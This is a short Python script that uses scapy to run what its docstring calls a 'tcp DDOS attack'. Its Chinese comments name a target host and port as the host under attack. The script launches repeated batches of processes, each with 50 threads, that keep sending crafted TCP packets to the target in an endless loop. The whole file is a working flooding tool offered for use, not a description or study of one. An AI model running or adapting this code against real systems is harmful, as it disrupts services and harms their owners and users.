#!/usr/bin/python
# -*- coding=utf-8 -*-

from scapy.all import *
import multiprocessing
import threading

"""tcp DDOS attack"""

host = "172.16.20.75"  #被攻击主机
port = 2869  #被攻击主机端口
sp = 1025  
ll = threading.Lock() #线程锁，防止重复端口

def tcp_ack(h,p):
    ll.acquire()
    global sp
    sp += 1
    ll.release()
    response = IP(dst=h)/TCP(dport=p,sport=sp)
    send(response)

def mutil_threading():
    job = []
    for i in range(50):
        t = threading.Thread(target=tcp_ack,args=(host,port))
        job.append(t)
        t.start()
    for j in job:
        j.join()

def multi_process(count):
    for i in range(count):
        p = multiprocessing.Process(target=mutil_threading,args=())
        p.start()

if __name__ == "__main__":
    try:
        while True:
            multi_process(10)
    except KeyboardInterrupt:
        print "attack end"
